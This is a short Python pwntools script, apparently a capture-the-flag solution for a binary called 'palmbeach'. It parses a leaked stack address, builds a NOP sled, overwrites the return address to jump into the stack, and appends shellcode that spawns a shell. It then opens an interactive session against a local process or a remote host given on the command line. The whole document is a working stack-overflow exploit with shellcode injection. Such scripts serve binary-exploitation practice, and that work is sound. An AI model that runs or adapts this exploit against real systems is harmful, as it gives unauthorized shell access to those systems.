from pwn import *

def con(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug(exe, gdbscript='''
            b *func0+67
            c
            ''')
    else:
        return process(exe)


exe = './palmbeach'
io = con()
elf = context.binary = ELF(exe, checksec = False)

context.log_level = 'info'


io.recvuntil(b'Speed limit: ')
stack = int(io.recv().strip(),16)


info(f'stack address: {hex(stack)}')


payload = b'\x90'*168+ p64(stack+176) + asm(shellcraft.sh())

io.sendline(payload)
io.interactive()
